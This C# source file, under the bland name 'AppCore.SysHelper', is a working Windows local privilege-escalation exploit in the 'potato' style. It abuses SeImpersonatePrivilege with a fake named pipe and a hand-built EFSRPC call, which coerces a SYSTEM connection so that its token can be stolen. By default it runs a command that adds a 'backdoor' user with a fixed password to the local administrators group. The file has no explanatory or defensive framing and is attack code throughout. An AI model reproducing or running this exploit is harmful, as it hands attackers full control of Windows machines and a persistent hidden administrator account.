using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Security.Permissions;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;
using System.Linq;
using Microsoft.Win32.SafeHandles;

namespace AppCore
{
    public class SysHelper
    {
        static void Main(string[] args)
        {
            string outfile = @"C:\Users\Public\d.txt";
            string pipe = "lsarpc";

            LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                LookupPrivilegeValue(null, "SeImpersonatePrivilege", out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;
                AdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero);
            }
            string g = Guid.NewGuid().ToString("d");
            string fake = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hPipe = CreateNamedPipe(fake, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
            if (hPipe == new IntPtr(-1)) return;

            ManualResetEvent mre = new ManualResetEvent(false);
            StringBuilder sb = new StringBuilder();
            var tn = new Thread(o => {
                var arr = o as object[];
                var hp = (IntPtr)arr[0];
                var ev = (ManualResetEvent)arr[1];
                var out2 = (StringBuilder)arr[2];
                Console.Error.WriteLine("[*] Waiting pipe connect..."); ConnectNamedPipe(hp, IntPtr.Zero); Console.Error.WriteLine("[*] Pipe connected!");
                Console.Error.WriteLine("[*] Impersonating..."); if (ImpersonateNamedPipeClient(hp)) { Console.Error.WriteLine("[+] Got token!");
                    out2.Append("[USER] " + WindowsIdentity.GetCurrent().Name + "\n");
                    IntPtr hTok = IntPtr.Zero, hDup = IntPtr.Zero;
                    OpenThreadToken(GetCurrentThread(), 0x0003, false, out hTok);
                    DuplicateTokenEx(hTok, 0x02000000, IntPtr.Zero, 2, 1, out hDup);
                    var si3 = new SI2(); si3.cb = Marshal.SizeOf(si3);
                    si3.ld = "WinSta0\\Default"; si3.fl = 1;
                    var pi3 = new PI2();
                    string cmd3 = (arr.Length > 3 && arr[3] != null) ? (arr[3] as string) :
                        "cmd /c net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add";
                    bool ok3 = CreateProcessAsUser(hDup, null, cmd3, IntPtr.Zero, IntPtr.Zero, false, 0x08000000, IntPtr.Zero, null, ref si3, out pi3);
                    out2.Append("[CPU:ok=" + ok3 + " err=" + Marshal.GetLastWin32Error() + " pid=" + pi3.pid + "]\n");
                    if(ok3){ WaitForSingleObject(pi3.hp, 30000); CloseHandle(pi3.hp); CloseHandle(pi3.ht); }
                    CloseHandle(hDup); CloseHandle(hTok);
                    RevertToSelf();
                }
                ev.Set();
            });
            tn.IsBackground = true;
            string cmdArg = args.Length > 0 ? args[0] : "cmd /c net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add";
            tn.Start(new object[] { hPipe, mre, sb, cmdArg });

            var tn2 = new Thread(o => {
                object[] objs = o as object[];
                string guid = objs[0] as string;
                string p2 = objs[1] as string;
                Stub r = new Stub(p2);
                try { r.CallSvc("\\\\localhost/PIPE/" + guid + "/\\" + guid + "\\" + guid); } catch {}
            });
            tn2.IsBackground = true;
            tn2.Start(new object[] { g, pipe });

            if (mre.WaitOne(15000)) {
                File.WriteAllText(outfile, sb.ToString());
                Console.WriteLine(sb.ToString());
            }
            CloseHandle(hPipe);
        }

        [DllImport("advapi32.dll")] static extern bool OpenThreadToken(IntPtr t,uint a,bool o,out IntPtr h);
        [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
        [DllImport("advapi32.dll")] static extern bool DuplicateTokenEx(IntPtr h,uint a,IntPtr s,int i,int t,out IntPtr n);
        [DllImport("advapi32.dll",SetLastError=true)] static extern bool CreateProcessAsUser(IntPtr t,string ap,string cl,IntPtr pa,IntPtr ta,bool ih,uint cf,IntPtr ev,string cd,ref SI2 si,out PI2 pi);
        [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr h,uint ms);
        [StructLayout(LayoutKind.Sequential,CharSet=CharSet.Auto)] struct SI2{public int cb,r1,r2,r3;public string ld,lt;public int dx,dy,dxs,dys,dxc,dyc,df,fl;public short sw,cr;public IntPtr lr,si0,si1,si2;}
        [StructLayout(LayoutKind.Sequential)] struct PI2{public IntPtr hp,ht;public int pid,tid;}

        [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr CreateNamedPipe(string n,uint d,uint f,uint m,uint o,uint i,uint t,IntPtr s);
        [DllImport("kernel32.dll")] static extern bool ConnectNamedPipe(IntPtr h,IntPtr o);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
        [DllImport("advapi32.dll", SetLastError=true)] static extern bool ImpersonateNamedPipeClient(IntPtr h);
        [DllImport("advapi32.dll", SetLastError=true)] static extern bool RevertToSelf();
        [DllImport("advapi32.dll", SetLastError=true)] static extern bool LookupPrivilegeValue(string s,string n,out LUID l);
        [DllImport("advapi32.dll", SetLastError=true)] static extern bool AdjustTokenPrivileges(IntPtr t,bool d,ref TOKEN_PRIVILEGES n,int l,IntPtr p,IntPtr r);

        [StructLayout(LayoutKind.Sequential)] struct LUID { public uint LowPart; public int HighPart; }
        [StructLayout(LayoutKind.Sequential)] struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }
        [StructLayout(LayoutKind.Sequential)] struct TOKEN_PRIVILEGES { public int PrivilegeCount; [MarshalAs(UnmanagedType.ByValArray,SizeConst=1)] public LUID_AND_ATTRIBUTES[] Privileges; }
    }

class Stub
    {
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern IntPtr NdrClientCall2x86(IntPtr pSD, IntPtr formatString, IntPtr args);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcBindingFree(ref IntPtr lpString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = false)]
        private static extern Int32 RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

        [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
        private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

        [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl, CharSet = CharSet.Unicode, SetLastError = false)]
        internal static extern IntPtr NdrClientCall2x64(IntPtr pSD, IntPtr formatString, IntPtr binding, string FileName);

        private static byte[] PFSx86 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x0c, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x04, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x08, 0x00, 0x08, 0x00 };

        private static byte[] PFSx64 = new byte[] { 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x18, 0x00, 0x32, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x46, 0x02, 0x0a, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0b, 0x01, 0x08, 0x00, 0x0c, 0x00, 0x70, 0x00, 0x10, 0x00, 0x08, 0x00 };

        private static byte[] TFSx86 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };

        private static byte[] TFSx64 = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x11, 0x04, 0x02, 0x00, 0x30, 0xa0, 0x00, 0x00, 0x11, 0x08, 0x25, 0x5c, 0x00, 0x00 };
        Guid interfaceId;
        public Stub(string pipe)
        {
            IDictionary<string, string> bindingMapping = new Dictionary<string, string>()
            {
                {"lsarpc", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"efsrpc", "df1941c5-fe89-4e79-bf10-463657acf44d"},
                {"samr", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"lsass", "c681d488-d850-11d0-8c52-00c04fd90f7e"},
                {"netlogon", "c681d488-d850-11d0-8c52-00c04fd90f7e"}
            };

            interfaceId = new Guid(bindingMapping[pipe]);

            pipe = String.Format("\\pipe\\{0}", pipe);
            if (IntPtr.Size == 8)
            {
                InitializeStub(interfaceId, PFSx64, TFSx64, pipe, 1, 0);
            }
            else
            {
                InitializeStub(interfaceId, PFSx86, TFSx86, pipe, 1, 0);
            }
        }

        ~Stub()
        {
            freeStub();
        }
        public int CallSvc(string FileName)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);

            try
            {
                if (IntPtr.Size == 8)
                {
                    result = NdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni("localhost")), FileName);
                }
                else
                {
                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni("localhost")), pfn);
                }
            }
            catch (SEHException)
            {
                int err = Marshal.GetExceptionCode();
                Console.WriteLine("[x] CallSvc failed: " + err);
                return err;
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }
        private byte[] PFS;
        private byte[] TFS;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;

        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] PFS, byte[] TFS, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.PFS = PFS;
            this.TFS = TFS;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.PFS, GCHandleType.Pinned);

            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(TFS, GCHandleType.Pinned);

            SD stubObject = new SD(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));

            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }


        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);

        protected static IntPtr AllocateMemory(int size)
        {
            IntPtr memory = Marshal.AllocHGlobal(size);
            return memory;
        }

        delegate void freememory(IntPtr memory);

        protected static void FreeMemory(IntPtr memory)
        {
            Marshal.FreeHGlobal(memory);
        }


        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = RpcStringBindingCompose(interfaceId.ToString(), "ncacn_np", server, PipeName, null, out bindingstring);
            if (status != 0)
            {
                return IntPtr.Zero;
            }
            status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            RpcBindingFree(ref bindingstring);
            if (status != 0)
            {
                return IntPtr.Zero;
            }

            status = RpcBindingSetAuthInfo(binding, server, /* RPC_C_AUTHN_LEVEL_PKT_PRIVACY */ 6, /* RPC_C_AUTHN_GSS_NEGOTIATE */ 9, IntPtr.Zero, 16);
            if (status != 0)
            {
            }

            status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            if (status != 0)
            {
            }
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset)
        {
            return Marshal.UnsafeAddrOfPinnedArrayElement(PFS, offset);
        }

        protected IntPtr GetStubHandle()
        {
            return stub.AddrOfPinnedObject();
        }
        protected IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
        {

            GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
            IntPtr result;
            try
            {
                result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
            }
            finally
            {
                stackhandle.Free();
            }
            return result;
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    struct COMM_FAULT_OFFSETS
    {
        public short CommOffset;
        public short FaultOffset;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_VERSION
    {
        public ushort MajorVersion;
        public ushort MinorVersion;
        public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            MajorVersion = InterfaceVersionMajor;
            MinorVersion = InterfaceVersionMinor;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_SYNTAX_IDENTIFIER
    {
        public Guid SyntaxGUID;
        public RPC_VERSION SyntaxVersion;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct RPC_CLIENT_INTERFACE
    {
        public uint Length;
        public RPC_SYNTAX_IDENTIFIER InterfaceId;
        public RPC_SYNTAX_IDENTIFIER TransferSyntax;
        public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
        public uint RpcProtseqEndpointCount;
        public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
        public IntPtr Reserved;
        public IntPtr InterpreterInfo;
        public uint Flags;

        public static Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);

        public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
        {
            Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
            RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
            InterfaceId = new RPC_SYNTAX_IDENTIFIER();
            InterfaceId.SyntaxGUID = iid;
            InterfaceId.SyntaxVersion = rpcVersion;
            rpcVersion = new RPC_VERSION(2, 0);
            TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
            TransferSyntax.SyntaxGUID = IID_SYNTAX;
            TransferSyntax.SyntaxVersion = rpcVersion;
            DispatchTable = IntPtr.Zero;
            RpcProtseqEndpointCount = 0u;
            RpcProtseqEndpoint = IntPtr.Zero;
            Reserved = IntPtr.Zero;
            InterpreterInfo = IntPtr.Zero;
            Flags = 0u;
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct SD
    {
        public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
        public IntPtr pfnAllocate;
        public IntPtr pfnFree;
        public IntPtr pAutoBindHandle;
        public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
        public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
        public IntPtr /*EXPR_EVAL*/ apfnExprEval;
        public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
        public IntPtr pFormatTypes;
        public int fCheckBounds;
        /* Ndr library version. */
        public uint Version;
        public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
        public int MIDLVersion;
        public IntPtr CommFaultOffsets;
        // New fields for version 3.0+
        public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
        // Notify routines - added for NT5, MIDL 5.0
        public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
        public IntPtr mFlags;
        // International support routines - added for 64bit post NT5
        public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
        public IntPtr ProxyServerInfo;
        public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
        // Fields up to now present in win2000 release.

        public SD(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                IntPtr pfnAllocatePtr, IntPtr pfnFreePtr)
        {
            pFormatTypes = pFormatTypesPtr;
            RpcInterfaceInformation = RpcInterfaceInformationPtr;
            CommFaultOffsets = IntPtr.Zero;
            pfnAllocate = pfnAllocatePtr;
            pfnFree = pfnFreePtr;
            pAutoBindHandle = IntPtr.Zero;
            apfnNdrRundownRoutines = IntPtr.Zero;
            aGenericBindingRoutinePairs = IntPtr.Zero;
            apfnExprEval = IntPtr.Zero;
            aXmitQuintuple = IntPtr.Zero;
            fCheckBounds = 1;
            Version = 0x50002u;
            pMallocFreeStruct = IntPtr.Zero;
            MIDLVersion = 0x801026e;
            aUserMarshalQuadruple = IntPtr.Zero;
            NotifyRoutineTable = IntPtr.Zero;
            mFlags = new IntPtr(0x00000001);
            CsRoutineTables = IntPtr.Zero;
            ProxyServerInfo = IntPtr.Zero;
            pExprInfo = IntPtr.Zero;
        }
    }

}
